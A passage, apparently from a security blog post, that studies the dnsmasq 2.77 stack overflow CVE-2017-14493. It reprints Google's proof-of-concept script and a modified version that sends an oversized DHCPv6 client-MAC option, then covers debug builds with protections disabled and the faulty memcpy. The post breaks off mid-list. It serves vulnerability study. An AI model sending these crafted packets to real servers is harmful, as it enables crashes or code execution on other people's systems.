@@ -1,0 +1,869 @@
+<h2 id="what-is-dnsmasq-and-for-what-is-used">What is DNSmasq and for what is used?</h2>
+
+<p>Dnsmasq is flexible and lightweight DNS (Domain Name System) forwarder and DHCP (Dynamic Host Configuration Protocol) server software that combines important networking services into a single, efficient package. It works as a DNS router, a DHCP server, a network boot server, and even a TFTP server, giving it a wide range of features and functions that are important for managing networks well.</p>
+
+<p>Dnsmasq’s major job is to act as a DNS forwarder, which lets client devices translate domain names into IP addresses. It does this by keeping a local cache of DNS records, which makes less use of external DNS servers and improves the general performance of the network. The cache function of Dnsmasq speeds up the response time for subsequent DNS queries. This reduces latency and improves the efficiency of the network.</p>
+
+<p>In addition to DNS forwarding, Dnsmasq offers DHCP services to dynamically give IP addresses, subnet masks, gateway addresses, and other network configuration parameters to client devices. By acting as a DHCP server, Dnsmasq makes network management easier by automating IP address management, getting rid of the need to give IP addresses by hand, and making it easier to control network connectivity from a central location.</p>
+
+<p><strong>Note: This application is used by default in all Ubuntu Linux systems.</strong></p>
+
+<h2 id="study-cve-2017-14493-stack-base-overflow-in-dnsmasq-277">Study CVE-2017-14493 Stack Base Overflow in dnsmasq 2.77</h2>
+
+<p>Google researchers have discovered multiple vulnerabilities in dnsmasq, a widely used DNS forwarding and DHCP server software. The findings were detailed in an article titled “<strong>Behind Masq: Yet More DNS and DHCP Software Flaws</strong>” published on the Google Security Blog. These vulnerabilities, including the CVE-2017-14493 stack base overflow in dnsmasq version 2.77, expose systems to potential remote code execution and denial-of-service attacks. To learn more about the vulnerabilities identified by Google researchers, you can visit the full article at <a href="https://security.googleblog.com/2017/10/behind-masq-yet-more-dns-and-dhcp.html">https://security.googleblog.com/2017/10/behind-masq-yet-more-dns-and-dhcp.html</a>. It is crucial for users of dnsmasq 2.77 or earlier versions to take immediate action by applying patches or upgrading to patched versions to mitigate the risks associated with these vulnerabilities and ensure the security of their systems.</p>
+
+<p>The PoC Provided by google can be found here <a href="https://github.com/google/security-research-pocs/blob/master/vulnerabilities/dnsmasq/CVE-2017-14493.py">https://github.com/google/security-research-pocs/blob/master/vulnerabilities/dnsmasq/CVE-2017-14493.py</a>. Let’s test this script:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
+#
+# Copyright 2017 Google Inc
+#
+# Licensed under the Apache License, Version 2.0 (the "License");
+# you may not use this file except in compliance with the License.
+# You may obtain a copy of the License at
+#
+#     http://www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing, software
+# distributed under the License is distributed on an "AS IS" BASIS,
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# See the License for the specific language governing permissions and
+# limitations under the License.
+#
+# Authors:
+#  Fermin J. Serna &lt;fjserna@google.com&gt;
+#  Felix Wilhelm &lt;fwilhelm@google.com&gt;
+#  Gabriel Campana &lt;gbrl@google.com&gt;
+#  Kevin Hamacher &lt;hamacher@google.com&gt;
+#  Gynvael Coldwind &lt;gynvael@google.com&gt;
+#  Ron Bowes - Xoogler :/
+</span>
+<span class="kn">from</span> <span class="n">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">socket</span>
+
+<span class="k">def</span> <span class="nf">send_packet</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] sending {} bytes to {}:{}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET6</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_DGRAM</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">IPPROTO_UDP</span><span class="p">)</span>
+
+    <span class="n">s</span><span class="p">.</span><span class="nf">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_SNDBUF</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+    <span class="k">if</span> <span class="n">s</span><span class="p">.</span><span class="nf">sendto</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span> <span class="o">!=</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[!] Could not send (full) payload</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">u8</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">u16</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">!H</span><span class="sh">"</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">gen_option</span><span class="p">(</span><span class="n">option</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">length</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">length</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">length</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="sa">b</span><span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span>
+        <span class="nf">u16</span><span class="p">(</span><span class="n">option</span><span class="p">),</span>
+        <span class="nf">u16</span><span class="p">(</span><span class="n">length</span><span class="p">),</span>
+        <span class="n">data</span>
+    <span class="p">])</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+    <span class="k">assert</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">,</span> <span class="sh">"</span><span class="s">{} &lt;ip&gt; &lt;port&gt;</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="n">pkg</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span>
+        <span class="nf">u8</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span>                         <span class="c1"># DHCP6RELAYFORW
+</span>        <span class="nf">u16</span><span class="p">(</span><span class="mh">0x0313</span><span class="p">),</span> <span class="nf">u8</span><span class="p">(</span><span class="mh">0x37</span><span class="p">),</span>          <span class="c1"># transaction ID
+</span>        <span class="sa">b</span><span class="sh">"</span><span class="s">_</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">34</span> <span class="o">-</span> <span class="mi">4</span><span class="p">),</span>
+        <span class="c1"># Option 79 = OPTION6_CLIENT_MAC
+</span>        <span class="c1"># Moves argument into char[DHCP_CHADDR_MAX], DHCP_CHADDR_MAX = 16
+</span>        <span class="nf">gen_option</span><span class="p">(</span><span class="mi">79</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">74</span> <span class="o">+</span> <span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;Q</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0x1337DEADBEEF</span><span class="p">)),</span>
+    <span class="p">])</span>
+
+    <span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+    <span class="nf">send_packet</span><span class="p">(</span><span class="n">pkg</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="nf">int</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/headers/dnsmasq/dnsmasq1.png" alt="dnsmasq" /></p>
+
+<p>Remember that this test was done without any protection.</p>
+
+<h2 id="prepare-a-debug-environment-and-investigate-the-root-cause">Prepare a Debug Environment and Investigate the ROOT Cause</h2>
+<h3 id="debug-environment">Debug Environment</h3>
+<p>First, we have to setup the right program and start compile from scratch. I made a little repository on my github with all you need to install this application. <a href="https://github.com/T3jv1l/dnsmasq-2.77-POC">https://github.com/T3jv1l/dnsmasq-2.77-POC</a></p>
+
+<ul>
+  <li>
+    <p>System require Ubuntu 18.04.6 LTS</p>
+  </li>
+  <li>Download the required dependency packages:
+    <ul>
+      <li>libllvm-3.9-ocaml-dev_3.9.1-5ubuntu1_amd64.deb</li>
+      <li>libllvm3.9_3.9.1-19ubuntu1_amd64.deb
+        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>  dpgk <span class="nt">-i</span> libllvm-3.9-ocaml-dev_3.9.1-5ubuntu1_amd64.deb
+  dpgk <span class="nt">-i</span> libllvm3.9_3.9.1-19ubuntu1_amd64.deb
+</pre></td></tr></tbody></table></code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+  <li>Install additional dependencies:
+    <ul>
+      <li>To complete the installation process, you need to install several additional dependencies.
+        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>  <span class="nb">sudo </span>apt-get <span class="nb">install </span>llvm-3.9-dev gcc make perl clang-3.9 clang-3.9-doc libclang-common-3.9-dev libclang-3.9-dev libclang1-3.9 libclang1-3.9-dbg libllvm3.9 libllvm3.9-dbg lldb-3.9 llvm-3.9 llvm-3.9-dev llvm-3.9-doc llvm-3.9-examples llvm-3.9-runtime clang-format-3.9 python-clang-3.9 libfuzzer-3.9-dev
+</pre></td></tr></tbody></table></code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+  <li>Install additional dependencies:
+    <ul>
+      <li>Once the installation process is complete, you can verify if the dependencies are successfully installed by running the following command:
+        <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>  llvm-config-3.9 <span class="nt">--version</span>
+</pre></td></tr></tbody></table></code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+  <li>To further enhanc and stability of your dnsmasq installation, you can utilize additional environment variables. These variables help configure the build process with specific flags and options for AddressSanitizer, a powerful memory error detector and sanitizer tool (this help us to do debugg).
+    <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">CFLAGS</span><span class="o">=</span><span class="s2">"-O1 -g -fsanitize=address,bool,float-cast-overflow,integer-divide-by-zero,return,returns-nonnull-attribute,shift-exponent,signed-integer-overflow,unreachable,vla-bound -fno-sanitize-recover=all -fno-omit-frame-pointer -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1"</span>
+<span class="nb">export </span><span class="nv">CXXFLAGS</span><span class="o">=</span><span class="s2">"-O1 -g -fsanitize=address,bool,float-cast-overflow,integer-divide-by-zero,return,returns-nonnull-attribute,shift-exponent,signed-integer-overflow,unreachable,vla-bound -fno-sanitize-recover=all -fno-omit-frame-pointer -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1"</span>
+<span class="nb">export </span><span class="nv">LDFLAGS</span><span class="o">=</span><span class="s2">"-g -fsanitize=address,bool,float-cast-overflow,integer-divide-by-zero,return,returns-nonnull-attribute,shift-exponent,signed-integer-overflow,unreachable,vla-bound"</span>
+<span class="nb">export </span><span class="nv">CC</span><span class="o">=</span><span class="s2">"/usr/bin/clang-3.9"</span>
+<span class="nb">export </span><span class="nv">CXX</span><span class="o">=</span><span class="s2">"/usr/bin/clang++-3.9"</span>
+<span class="nb">export </span><span class="nv">ASAN_OPTIONS</span><span class="o">=</span><span class="s2">"exitcode=1,handle_segv=1,detect_leaks=1,leak_check_at_exit=1,allocator_may_return_null=1,detect_odr_violation=0"</span>
+<span class="nb">export </span><span class="nv">ASAN_SYMBOLIZER_PATH</span><span class="o">=</span><span class="s2">"/usr/lib/llvm-3.9/bin/llvm-symbolizer"</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>To proceed with building our application, it is necessary to modify the flags in the Makefile to disable all the protection and generate the symbols for GDB line 27-27.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>CFLAGS <span class="o">=</span> <span class="nt">-Wall</span> <span class="nt">-W</span> <span class="nt">-O0</span> <span class="nt">-ggdb</span> <span class="nt">-fno-stack-protector</span>
+LDFLAGS <span class="o">=</span> <span class="nt">-z</span> execstack <span class="nt">-fno-stack-protector</span> <span class="nt">-no-pie</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>I made some bash scripting to modify the config of DNS to open and restart the DNSmasq applicatian also to attach in debugging mode. The script looks like this (this is not the best way to debugg an application, but for me it’s works):</p>
+
+<p>Start server <code class="language-plaintext highlighter-rouge">server.sh</code>:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
+
+<span class="nb">cat</span> <span class="o">&lt;&lt;</span><span class="no">EOF</span><span class="sh"> &gt; /etc/systemd/resolved.conf
+#  This file is part of systemd.
+#
+#  systemd is free software; you can redistribute it and/or modify it
+#  under the terms of the GNU Lesser General Public License as published by
+#  the Free Software Foundation; either version 2.1 of the License, or
+#  (at your option) any later version.
+#
+# Entries in this file show the compile time defaults.
+# You can change settings by editing this file.
+# Defaults can be restored by simply deleting this file.
+#
+# See resolved.conf(5) for details
+
+[Resolve]
+#DNS=
+#FallbackDNS=
+#Domains=
+#LLMNR=no
+#MulticastDNS=no
+#DNSSEC=no
+#Cache=yes
+DNSStubListener=no
+</span><span class="no">EOF
+
+</span><span class="nb">sudo </span>systemctl daemon-reload
+<span class="nb">sudo </span>systemctl restart systemd-resolved.service
+<span class="nb">sudo </span>gdb <span class="nt">--silent</span> /home/hack/Desktop/dnsmasq/src/dnsmasq
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Restore server <code class="language-plaintext highlighter-rouge">restore-server.sh</code>:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
+
+<span class="nb">cat</span> <span class="o">&lt;&lt;</span><span class="no">EOF</span><span class="sh"> &gt; /etc/systemd/resolved.conf
+#  This file is part of systemd.
+#
+#  systemd is free software; you can redistribute it and/or modify it
+#  under the terms of the GNU Lesser General Public License as published by
+#  the Free Software Foundation; either version 2.1 of the License, or
+#  (at your option) any later version.
+#
+# Entries in this file show the compile time defaults.
+# You can change settings by editing this file.
+# Defaults can be restored by simply deleting this file.
+#
+# See resolved.conf(5) for details
+
+[Resolve]
+#DNS=
+#FallbackDNS=
+#Domains=
+#LLMNR=no
+#MulticastDNS=no
+#DNSSEC=no
+#Cache=yes
+#DNSStubListener=no
+</span><span class="no">EOF
+
+</span><span class="nb">sudo </span>systemctl daemon-reload
+<span class="nb">sudo </span>systemctl restart systemd-resolved.service
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h3 id="investigate-the-root-cause">Investigate the ROOT Cause</h3>
+<p>In the case of dnsmasq, investigating the root cause of an issue may involve studying error logs, examining relevant code sections, reviewing system configurations, analyzing network traffic, or leveraging debugging tools and techniques. This process helps in uncovering any software defects, misconfigurations, compatibility issues, or external factors that may be responsible for the observed behavior.</p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">server.sh</code> we start a gdb instance and we will run the DNSmasq application</p>
+
+<p><img src="/assets/img/headers/dnsmasq/dnsmasq2.png" alt="dnsmasq" /></p>
+
+<p>Edit the PoC to see where in code the application crash.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
+</span>
+<span class="kn">from</span> <span class="n">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">import</span> <span class="n">binascii</span>
+
+<span class="k">def</span> <span class="nf">send_packet</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] sending {} bytes to {}:{}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET6</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_DGRAM</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">IPPROTO_UDP</span><span class="p">)</span>
+
+    <span class="n">s</span><span class="p">.</span><span class="nf">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_SNDBUF</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+    <span class="k">if</span> <span class="n">s</span><span class="p">.</span><span class="nf">sendto</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span> <span class="o">!=</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[!] Could not send (full) payload</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">u8</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">u16</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">!H</span><span class="sh">"</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">gen_option</span><span class="p">(</span><span class="n">option</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">length</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">length</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">length</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="sa">b</span><span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span>
+        <span class="nf">u16</span><span class="p">(</span><span class="n">option</span><span class="p">),</span>
+        <span class="nf">u16</span><span class="p">(</span><span class="n">length</span><span class="p">),</span>
+        <span class="n">data</span>
+    <span class="p">])</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+    <span class="k">assert</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">,</span> <span class="sh">"</span><span class="s">{} &lt;ip&gt; &lt;port&gt;</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="n">pkg</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span>
+        <span class="nf">u8</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span>                         <span class="c1"># DHCP6RELAYFORW
+</span>        <span class="nf">u16</span><span class="p">(</span><span class="mh">0x0313</span><span class="p">),</span> <span class="nf">u8</span><span class="p">(</span><span class="mh">0x37</span><span class="p">),</span>          <span class="c1"># transaction ID
+</span>        <span class="sa">b</span><span class="sh">"</span><span class="s">_</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">34</span> <span class="o">-</span> <span class="mi">4</span><span class="p">),</span>
+        <span class="c1"># Option 79 = OPTION6_CLIENT_MAC
+</span>        <span class="c1"># Moves argument into char[DHCP_CHADDR_MAX], DHCP_CHADDR_MAX = 16
+</span>        <span class="nf">gen_option</span><span class="p">(</span><span class="mi">79</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">1000</span><span class="p">),</span>
+    <span class="p">])</span>
+
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Packer Header (38 bytes):</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="nf">hexlify</span><span class="p">(</span><span class="n">pkg</span><span class="p">)[</span><span class="mi">0</span><span class="p">:</span><span class="mi">76</span><span class="p">])</span>
+    <span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+    <span class="nf">send_packet</span><span class="p">(</span><span class="n">pkg</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="nf">int</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/headers/dnsmasq/dnsmasq3.png" alt="dnsmasq" /></p>
+
+<p>Using the ggdb symbols we can see where the application stop at first crash.</p>
+
+<p><img src="/assets/img/headers/dnsmasq/dnsmasq4.png" alt="dnsmasq" /></p>
+
+<p>If you see the our exploit it’s create a fake DHCP6RELAYFORW and a transaction ID to pass the execution. If you take a look inside the rfc3315.c at line 103-107 you can see what our exploit try to fake it.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="p">....</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">dhcp6_maybe_relay</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="p">,</span> <span class="n">daemon</span><span class="o">-&gt;</span><span class="n">dhcp_packet</span><span class="p">.</span><span class="n">iov_base</span><span class="p">,</span> <span class="n">sz</span><span class="p">,</span> <span class="n">client_addr</span><span class="p">,</span> 
+			<span class="n">IN6_IS_ADDR_MULTICAST</span><span class="p">(</span><span class="n">client_addr</span><span class="p">),</span> <span class="n">now</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">msg_type</span> <span class="o">==</span> <span class="n">DHCP6RELAYFORW</span> <span class="o">?</span> <span class="n">DHCPV6_SERVER_PORT</span> <span class="o">:</span> <span class="n">DHCPV6_CLIENT_PORT</span><span class="p">;</span>
+<span class="p">...</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>The code snippet determines the return value of a function based on certain conditions. If the <code class="language-plaintext highlighter-rouge">dhcp6_maybe_relay()</code> function call returns true, the returned value depends on whether <code class="language-plaintext highlighter-rouge">msg_type</code> is equal to <code class="language-plaintext highlighter-rouge">DHCP6RELAYFORW</code>.</p>
+
+<p>Anothe important aspect is that we need a proper value for <code class="language-plaintext highlighter-rouge">DHCP6RELAYFORW</code> and for <code class="language-plaintext highlighter-rouge">OPTION6_CLIENT_MAC</code> this have a specific syscall, in our case can be found in dhcp6-protocol.h (If you want to know why we have these values in our exploit.)</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="cp">#define DHCP6RELAYFORW    12
+#define OPTION6_CLIENT_MAC 79
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>After we pass the dhcp6_maybe_relay the true root cause is the <code class="language-plaintext highlighter-rouge">OPTION6_CLIENT_MAC</code> if you look down at line 207-212 we have the next snipped code.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="p">.....</span>
+  <span class="k">if</span> <span class="p">((</span><span class="n">opt</span> <span class="o">=</span> <span class="n">opt6_find</span><span class="p">(</span><span class="n">opts</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">OPTION6_CLIENT_MAC</span><span class="p">,</span> <span class="mi">3</span><span class="p">)))</span>
+    <span class="p">{</span>
+      <span class="n">state</span><span class="o">-&gt;</span><span class="n">mac_type</span> <span class="o">=</span> <span class="n">opt6_uint</span><span class="p">(</span><span class="n">opt</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+      <span class="n">state</span><span class="o">-&gt;</span><span class="n">mac_len</span> <span class="o">=</span> <span class="n">opt6_len</span><span class="p">(</span><span class="n">opt</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
+      <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">mac</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">opt6_ptr</span><span class="p">(</span><span class="n">opt</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">mac_len</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">......</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>The code checks for the presence of a DHCPv6 option with the code <code class="language-plaintext highlighter-rouge">OPTION6_CLIENT_MAC</code> and performs actions to extract and store relevant data from that option. The extracted information includes the mac_type, mac_len, and mac values, which are stored in the state structure or variables. But the <code class="language-plaintext highlighter-rouge">memcpy()</code> size is not correctly determined and this can lead into a code execution.</p>
+
+<p>To summarize what <code class="language-plaintext highlighter-rouge">DHCP6RELAYFORW</code>, <code class="language-plaintext highlighter-rouge">OPTION6_CLIENT_MAC</code> and <code class="language-plaintext highlighter-rouge">Transaction ID</code> are:</p>
+
+<ul>
+  <li>
